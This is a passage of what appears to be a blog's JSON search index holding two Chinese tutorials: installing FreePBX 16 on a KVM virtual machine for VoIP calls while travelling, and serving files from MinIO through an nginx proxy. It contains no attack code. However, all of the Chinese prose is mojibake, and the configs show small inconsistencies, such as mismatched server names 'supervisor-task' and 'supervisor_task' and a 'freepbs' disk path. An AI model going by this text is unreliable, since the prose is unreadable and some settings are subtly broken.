src=\"/posts/20240105-voip_iphone/image-20240105135104823.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€ä»£çš„åŸç†ä¼¼ä¹æ˜¯æŠŠæ‰‹æœºçš„ä¿¡å·ç›´æ¥é€šè¿‡ç½‘ç»œè½¬ç§»åˆ°äº†å›½å†…ï¼Œéšèº«æºå¸¦ç„¶åé…åˆappä½¿ç”¨ï¼Œè¿™ç‚¹éå¸¸ç‰›å§ï¼å›½å†…çš„çªœå‡ºç‚¹ä¼šéšæœºï¼Œå¿½è€Œå¤©æ´¥ï¼Œå¿½è€Œåˆ«çš„åœ°æ–¹ï¼Œæ‰€ä»¥å‘¼å‡ºç”µè¯æä¸å¥½æ˜¯é•¿é€”è®¡è´¹ã€‚ç¬¬ä¸€æ¬¡å‘¢å…«æˆ’æ˜¯åœ¨å¡ç­å²›ä¸­éƒ¨é‚£ä¸ªéº¦å½“åŠ³é™„è¿‘ï¼Œç”¨è¿™ä¸ªæ¥åˆ°äº†å›½å†…çš„ç”µè¯ï¼Œè¯´æ˜¯å‡ºå¤§äº‹äº†ï¼Œæœ‰äººæŠŠå…¬å¸æ•°æ®åº“çš„æ•°æ®ç»™æ”¹äº†ï¼Œå½“æ—¶çº¦å®šä¸‹åˆ6ï¼š00å†æ‰“ï¼Œç„¶åä¸‹åˆåœ¨å°æ¹¾ç‰›è‚‰é¢çš„åº—é‡Œï¼Œåˆç”¨è¿™ä¸ªå¾€å›½å†…é€šäº†ç”µè¯ï¼Œæ‰“äº†åŠä¸ªå¤šå°æ—¶ï¼Œé¢†å¯¼å‘ŠçŸ¥äº†å…·ä½“çš„æƒ…å†µï¼Œè¦æ˜¯æ¥ä¸èµ·æ¥é‚£å¯çœŸå°±éº»çƒ¦å¤§äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªæ˜¯å®ƒç¬¬äºŒä»£çš„äº§å“ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105135031364\" loading=\"lazy\" src=\"/posts/20240105-voip_iphone/image-20240105135031364.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªæ˜¯å‡çº§ç‰ˆproï¼Œå°±æ›´å‰å®³äº†ï¼Œç›´æ¥æ”¾å®¶é‡Œï¼Œæ‰‹æœºä¸Šä¸‹ä¸ªappï¼Œæœ‰ç½‘ç»œå°±èƒ½ç”¨äº†ï¼Œä¸ç”¨åƒç¬¬ä¸€ä»£ä¸€æ ·éšèº«æºå¸¦äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªæ›´æ˜¯æ•‘å‘½äº†ï¼Œè¯è¯´ç¬¬äºŒå›åœ¨å¡ç­çš„æ—¶å€™æ­£æ˜¯ç–«æƒ…åˆšå‘ä½œçš„æ—¶å€™ï¼Œå¡ç­ç›´æ¥å°å²›äº†ï¼Œç„¶åå¥½å¤šèˆªç­éƒ½å»¶æœŸæˆ–ç»ˆæ­¢äº†ï¼Œå°±æ˜¯ç”¨è¿™ä¸ªæ—…é¡ºæ‰“å›½å†…ç”µè¯æ”¹ç­¾äº†å›å›½çš„æœºç¥¨ï¼Œè¶³è¶³æ‰“äº†ä¸¤ä¸ªå°æ—¶å•Šï¼Œåˆ°å¤„å çº¿ç­‰å¾…ï¼Œå¦‚æœæ‰“å›½é™…é•¿é€”çš„è¯è´¹ç”¨ä¸å ªè®¾æƒ³ï¼Œå¦å¤–æ‰“å¡ç­å¤§éŸ©èˆªç©ºçš„ç”µè¯æ”¹ç­¾ä¸¤ç¨‹æœºç¥¨ä¹Ÿæ˜¯ä¸å¯æƒ³åƒçš„ï¼Œæ‰€ä»¥ï¼Œå…³é”®æ—¶åˆ»æ˜¯çœŸçš„æ•‘å‘½å•Šã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¹ˆå¥½çš„è½¯ä»¶å´ç›´æ¥å€’é—­æ¶ˆå¤±äº†ï¼ŒçœŸæ˜¯ä¸‡åˆ†å¯æƒœå•Šã€‚\u003c/p\u003e\n\u003cp\u003eå“ï¼Œç°åœ¨æ²¡æœ‰è¿™ä¸ªäº†ï¼Œåªèƒ½è‡ªå·±æ­ä¸€ä¸ªvoipç”µè¯è‡ªç”¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eåˆšå¼€å§‹æ˜¯è€ƒè™‘RasPBXï¼Œå…¶å®è‡ªå·±ç”¨æ ‘è“æ´¾æ­è¿‡ï¼Œè´¹äº‹ä¸è¯´ï¼Œä¸»è¦æ ‘è“æ´¾å®¹æ˜“æ­»æœºï¼ŒåŠ¡å¿…è¦ç¨³å®šï¼Œæ‰€ä»¥å¹²è„†ç”¨FreePBXæ­å»ºåœ¨kvmæœåŠ¡å™¨è™šæ‹Ÿæœºä¸Šçš„æ–¹å¼ï¼Œæ¥ä¿æŒç»å¯¹ç¨³å®šã€‚\u003c/p\u003e\n\u003cp\u003eä»¥ä¸‹æ•™ç¨‹åªé€‚ç”¨äº FreePBX 16 çš„å®˜æ–¹ISOï¼Œå…·ä½“åšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…kvmè™šæœº\"\u003eä¸€ã€å®‰è£…KVMè™šæœºï¼š\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#ä¸‹è½½FreePBX16çš„isoå…‰ç›˜\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åˆ›å»ºqcow2è™šæœºæ–‡ä»¶\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eqemu-img create -f qcow2 freepbx-8-2-60/freepbx-8-2-60.qcow2 20G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--name\u003cspan class=\"o\"\u003e=\u003c/span\u003efreepbx-8-2-60 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e8096\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--disk \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/freepbx-8-2-60/freepbs-8-2-60.qcow2,format\u003cspan class=\"o\"\u003e=\u003c/span\u003eqcow2,size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/SNG7-PBX16-64bit-2302-1.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003elinux \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5916\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç”¨vncè¿æ¥5916ç«¯å£å®‰è£…ï¼Œè®¾ç½®ä¸€ä¸‹rootçš„å¯†ç å®‰è£…ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å®‰è£…å¥½åï¼Œç³»ç»Ÿå…¶å®æ˜¯dhcpåŠ¨æ€è·å¾—ipçš„ï¼Œè¿›å…¥çœ‹äº†çœ‹ï¼Œæ˜¯Centosï¼Œæˆ‘ä»¬ä¸éœ€è¦dhcpï¼ŒæŠŠIPç»™å›ºå®šæ­»\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/sysconfig/network-scripts/ifcfg-eth0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Ethernet\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBOOTPROTO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;static\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eIPADDR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10.8.2.60\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNETMASK\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e255.255.255.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eGATEWAY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10.8.2.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDNS1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e114.114.114.114\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEFROUTE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;yes\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNAME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;eth0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;eth0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;yes\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSSHç™»å½•ä¸€ä¸‹æ²¡é—®é¢˜ï¼Œçœ‹åˆ°ç»¿æ¡†å°±okäº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105141241964\" loading=\"lazy\" src=\"/posts/20240105-voip_iphone/image-20240105141241964.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"äºŒé…ç½®freepbxçš„åˆ†æœº\"\u003eäºŒã€é…ç½®FreePBXçš„åˆ†æœº\u003c/h2\u003e\n\u003cp\u003eæ‰“å¼€ç½‘å€ http://10.8.2.60 , ç™»å½• FreePBX Administration\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105144025926\" loading=\"lazy\" src=\"/posts/20240105-voip_iphone/image-20240105144025926.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç™»ä¸Šå»åæ˜¯è¿™ä¸ªæ ·å­\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105144212316\" loading=\"lazy\" src=\"/posts/20240105-voip_iphone/image-20240105144212316.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸Šé¢æˆ‘æ²¡æœ‰å¼€System Firewallï¼Œè¿™ä¸ªçœ‹ä¸ªäººéœ€æ±‚ï¼Œç»å¯¹ä¸è¦åƒå…¬ç½‘å¼€æ”¾80ç«¯å£ï¼Œåªå¼€5060çš„udpå’Œ1000-10004çš„UDPã€‚\u003c/p\u003e","title":"æœ€æ–°ç‰ˆå‡ºå›½æ—…è¡Œå®‰è£…ä¸€ä¸ªFreePBXçš„voipç”µè¯è‡ªç”¨"},{"content":"åŒäº‹æœ‰ä¸ªéœ€æ±‚ï¼Œæƒ³å¼€æ”¾ä¸ªåŸŸåï¼Œç»™åˆ«çš„åŒäº‹ä»¬ä¸‹è½½æ–‡ä»¶ç”¨ã€‚\nè¿™ä¸ªå…¶å®å¾ˆå»ºå•ï¼Œé—®é¢˜å°±æ˜¯æ–‡ä»¶æ€ä¹ˆæ”¾ä¸Šå»ï¼Œsftpã€ftpä»€ä¹ˆçš„éƒ½éœ€è¦æ­ä¸ªæœåŠ¡å™¨ï¼Œå…¶å®æœ€ç®€å•åº”è¯¥æ˜¯webdavï¼Œä½†æ˜¯æ”¾å…¬ç½‘åˆä¸å¤ªå®‰å…¨ã€‚\næœ¬æ¥è€ƒè™‘æ˜¯ç”¨ oss çš„æ¡¶ï¼Œå‰é¢ç›´æ¥å¥—ä¸ªCDNï¼Œä½†æ˜¯å¦‚æœæ¡¶æ–‡ä»¶æ³„éœ²è¢«ç–¯ç‹‚ä¸‹è½½ï¼Œä¹Ÿä¼šä»˜å‡ºé“¶ä¸¤ã€‚\næœ€ååšæ³•æ˜¯ç”¨ Minio å¼„ä¸€ä¸ªæ¨¡æ‹Ÿçš„æ¡¶ç¯å¢ƒï¼Œå‰é¢é…ç½®ä¸Š Nginxï¼Œå¸¦å®½é™åˆ¶åˆ°1Mï¼Œè¿™æ ·å°±æ— æ‰€è°“äº†ã€‚åŒäº‹ç”¨å¦ä¸€å°æœºå™¨æ¨¡æ‹ŸS3çš„APIå¾€ä¸Šé¢æ”¾æ–‡ä»¶ä¾›ä¸‹è½½ã€‚\nä¸€ã€minioçš„å®‰è£…\nä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç®€å•ç²—æš´å¯åŠ¨ï¼š\n#!/bin/bash nohup /app/minio/minio server --address \u0026#39;0.0.0.0:9000\u0026#39; --console-address \u0026#39;0.0.0.0:9001\u0026#39; /app/bucket \u0026gt; /app/minio/minio.log 2\u0026gt;\u0026amp;1 \u0026amp; è¿™æ ·å°±å¯åŠ¨äº†ï¼Œç„¶åç½‘é¡µæ‰“å¼€ http://10.10.247.211:9000 ï¼Œå°±å¯ä»¥çœ‹åˆ°ç™»å½•ç•Œé¢äº†\nç™»å½•åï¼Œæˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ªBucketï¼Œå°±å«åšpubæ¡¶ï¼ŒæŠŠpubæ¡¶çš„ç­–ç•¥æ”¹æˆpublicï¼Œè¿™æ ·nginxä»£ç†çš„æ—¶å€™æ‰èƒ½ç›´æ¥è®¿é—®åˆ°\nç„¶åæˆ‘ä»¬ä¸Šä¼ ä¸ªå›¾ç‰‡ï¼ŒBOMS3.0.pngï¼Œç„¶åå»/app/bucketç›®å½•ä¸‹çœ‹çœ‹\nç»“æœå‘ç°BOMS3.0.pngå±…ç„¶æ˜¯ä¸ªç›®å½•ï¼Œè¿›å»ç»§ç»­çœ‹\nmetaä¿¡æ¯å’Œè‹¥å¹²çš„partï¼Œçœ‹æ¥è¿™æ˜¯ä¸ºå¤šç‰ˆæœ¬å‡†å¤‡çš„ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦ç­–ç•¥æ˜¯publicçš„åŸå› ï¼Œä¸æ˜¯å°±æ— æ³•ä»9000è®¿é—®ã€‚\näºŒã€å®‰è£…é…ç½®nginx\nserver { listen 80; listen [::]:80; server_name supervisor-task.ddky.com; location / { return 301 https://supervisor-task.ddky.com$request_uri; } } server { listen 443 ssl; server_name supervisor_task.ddky.com; ssl_certificate /etc/nginx/cert/_.ddky.com.crt; ssl_certificate_key /etc/nginx/cert/_.ddky.com.key; ssl_session_timeout 5m; location / { rewrite ^/$ /pub/index.html break; proxy_pass http://10.10.247.211:9000/pub/; proxy_redirect off; } access_log /app/logs/access.log ; error_log /app/logs/error.log; } ä¸»è¦å°±æ˜¯è¦é…ç½®ä»£ç†ï¼Œä»£ç†åˆ°minioçš„9000ç«¯å£\nè¿™æ ·å°±å¥½äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231228-minio_nginx/","summary":"\u003cp\u003eåŒäº‹æœ‰ä¸ªéœ€æ±‚ï¼Œæƒ³å¼€æ”¾ä¸ªåŸŸåï¼Œç»™åˆ«çš„åŒäº‹ä»¬ä¸‹è½½æ–‡ä»¶ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªå…¶å®å¾ˆå»ºå•ï¼Œé—®é¢˜å°±æ˜¯æ–‡ä»¶æ€ä¹ˆæ”¾ä¸Šå»ï¼Œsftpã€ftpä»€ä¹ˆçš„éƒ½éœ€è¦æ­ä¸ªæœåŠ¡å™¨ï¼Œå…¶å®æœ€ç®€å•åº”è¯¥æ˜¯webdavï¼Œä½†æ˜¯æ”¾å…¬ç½‘åˆä¸å¤ªå®‰å…¨ã€‚\u003c/p\u003e\n\u003cp\u003eæœ¬æ¥è€ƒè™‘æ˜¯ç”¨ oss çš„æ¡¶ï¼Œå‰é¢ç›´æ¥å¥—ä¸ªCDNï¼Œä½†æ˜¯å¦‚æœæ¡¶æ–‡ä»¶æ³„éœ²è¢«ç–¯ç‹‚ä¸‹è½½ï¼Œä¹Ÿä¼šä»˜å‡ºé“¶ä¸¤ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€ååšæ³•æ˜¯ç”¨ Minio å¼„ä¸€ä¸ªæ¨¡æ‹Ÿçš„æ¡¶ç¯å¢ƒï¼Œå‰é¢é…ç½®ä¸Š Nginxï¼Œå¸¦å®½é™åˆ¶åˆ°1Mï¼Œè¿™æ ·å°±æ— æ‰€è°“äº†ã€‚åŒäº‹ç”¨å¦ä¸€å°æœºå™¨æ¨¡æ‹ŸS3çš„APIå¾€ä¸Šé¢æ”¾æ–‡ä»¶ä¾›ä¸‹è½½ã€‚\u003c/p\u003e\n\u003cp\u003eä¸€ã€minioçš„å®‰è£…\u003c/p\u003e\n\u003cp\u003eä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç®€å•ç²—æš´å¯åŠ¨ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003enohup /app/minio/minio server --address \u003cspan class=\"s1\"\u003e\u0026#39;0.0.0.0:9000\u0026#39;\u003c/span\u003e --console-address \u003cspan class=\"s1\"\u003e\u0026#39;0.0.0.0:9001\u0026#39;\u003c/span\u003e /app/bucket \u0026gt; /app/minio/minio.log 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±å¯åŠ¨äº†ï¼Œç„¶åç½‘é¡µæ‰“å¼€ http://10.10.247.211:9000 ï¼Œå°±å¯ä»¥çœ‹åˆ°ç™»å½•ç•Œé¢äº†\u003c/p\u003e\n\u003cp\u003eç™»å½•åï¼Œæˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ªBucketï¼Œå°±å«åšpubæ¡¶ï¼ŒæŠŠpubæ¡¶çš„ç­–ç•¥æ”¹æˆpublicï¼Œè¿™æ ·nginxä»£ç†çš„æ—¶å€™æ‰èƒ½ç›´æ¥è®¿é—®åˆ°\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20231228140755759\" loading=\"lazy\" src=\"/posts/20231228-minio_nginx/image-20231228140755759.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åæˆ‘ä»¬ä¸Šä¼ ä¸ªå›¾ç‰‡ï¼ŒBOMS3.0.pngï¼Œç„¶åå»/app/bucketç›®å½•ä¸‹çœ‹çœ‹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20231228141032738\" loading=\"lazy\" src=\"/posts/20231228-minio_nginx/image-20231228141032738.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç»“æœå‘ç°BOMS3.0.pngå±…ç„¶æ˜¯ä¸ªç›®å½•ï¼Œè¿›å»ç»§ç»­çœ‹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20231228141121489\" loading=\"lazy\" src=\"/posts/20231228-minio_nginx/image-20231228141121489.png\"\u003e\u003c/p\u003e\n\u003cp\u003emetaä¿¡æ¯å’Œè‹¥å¹²çš„partï¼Œçœ‹æ¥è¿™æ˜¯ä¸ºå¤šç‰ˆæœ¬å‡†å¤‡çš„ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦ç­–ç•¥æ˜¯publicçš„åŸå› ï¼Œä¸æ˜¯å°±æ— æ³•ä»9000è®¿é—®ã€‚\u003c/p\u003e\n\u003cp\u003eäºŒã€å®‰è£…é…ç½®nginx\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen      80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen      \u003cspan class=\"o\"\u003e[\u003c/span\u003e::\u003cspan class=\"o\"\u003e]\u003c/span\u003e:80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server_name  supervisor-task.ddky.com\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    location / \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"m\"\u003e301\u003c/span\u003e https://supervisor-task.ddky.com\u003cspan class=\"nv\"\u003e$request_uri\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen       \u003cspan class=\"m\"\u003e443\u003c/span\u003e ssl\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server_name  supervisor_task.ddky.com\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_certificate      /etc/nginx/cert/_.ddky.com.crt\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_certificate_key  /etc/nginx/cert/_.ddky.com.key\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_session_timeout 5m\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    location / \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        rewrite ^/$ /pub/index.html break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_pass http://10.10.247.211:9000/pub/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_redirect off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    access_log     /app/logs/access.log \u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    error_log      /app/logs/error.log\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 